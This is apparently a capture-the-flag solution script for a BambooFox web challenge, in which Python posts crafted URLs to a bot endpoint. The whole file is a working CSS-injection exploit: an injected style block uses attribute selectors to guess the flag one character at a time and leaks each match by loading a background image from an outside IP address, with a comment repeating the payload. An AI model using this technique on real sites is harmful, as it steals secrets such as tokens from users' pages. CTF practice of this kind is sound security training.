import requests

flag = 'BambooFox{ABACDBBDCABACDCDDABC'
for i in 'ABCD}':
    requests.post('http://web.djosix.com:15110/bot.php', 
        data = {'bot_url':'http://web.djosix.com:15110/?input=<style>[flag^="{}"]{{background:url(http://140.113.68.171:8000/{});}}</style>'.format(flag+i, i)})


'''
<style>
[flag^="BambooFox{A"]{
    background:url(http://140.113.68.171:8000);
}
</style>
'''
